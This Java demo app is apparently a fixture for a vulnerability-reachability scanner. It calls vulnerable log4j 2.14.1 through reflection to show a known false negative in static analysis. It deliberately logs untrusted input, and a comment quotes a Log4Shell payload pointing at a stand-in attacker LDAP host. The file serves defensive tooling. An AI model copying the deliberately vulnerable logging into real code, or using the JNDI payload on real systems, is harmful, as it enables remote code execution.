package com.example;

import java.lang.reflect.Method;

/**
 * Reflection-based Log4Shell demo — illustrates a KNOWN FALSE NEGATIVE.
 *
 * Dependency: log4j-core 2.14.1 (CVE-2021-44228, CVSS 10.0)
 * Same version as vulnerable-log4j-demo.
 *
 * This app invokes Logger.error() entirely through reflection:
 *   Class.forName("org.apache.logging.log4j.LogManager")
 *   -> getMethod("getLogger", Class.class)
 *   -> invoke(null, App.class)          // obtain Logger instance
 *   -> getMethod("error", Object.class)
 *   -> invoke(logger, userInput)        // triggers JNDI lookup if ${jndi:...}
 *
 * The ASM bytecode call graph extractor records only static bytecode edges.
 * It sees the string literal "org.apache.logging.log4j.LogManager" but
 * cannot follow the runtime dispatch through Class.forName() + invoke().
 * Therefore JndiLookup.lookup() does not appear as reachable.
 *
 * Pipeline result (static analysis):
 *   static.status : not_reachable          <- FALSE NEGATIVE
 *   decision      : not_affected_candidate
 *   risk_score    : 1.0  (CVSS 10.0 x 0.10 residual)
 *
 * Runtime reality:
 *   If userInput = "${jndi:ldap://attacker.com/a}", JNDI lookup IS triggered.
 *   This is the attack scenario the static residual weight of 0.10 is designed
 *   to represent: analysis uncertainty, not confirmed safety.
 *
 * This demo motivates the residual_risk_reason field in the report:
 *   ["reflection_not_modelled", "invokedynamic_not_modelled", ...]
 *
 * See also: static_analyzer.py confidence=0.7 (not 1.0) for NOT_REACHABLE.
 */
public class App {

    public static void main(String[] args) throws Exception {
        String userInput = args.length > 0 ? args[0] : "hello";

        // Obtain LogManager class via reflection — static graph cannot follow this
        Class<?> logManagerClass = Class.forName(
            "org.apache.logging.log4j.LogManager"
        );
        Method getLogger = logManagerClass.getMethod("getLogger", Class.class);
        Object logger = getLogger.invoke(null, App.class);

        // Invoke logger.error(userInput) via reflection
        Method errorMethod = logger.getClass().getMethod("error", Object.class);
        errorMethod.invoke(logger, (Object) userInput);

        System.out.println("Logged (via reflection): " + userInput);
    }
}
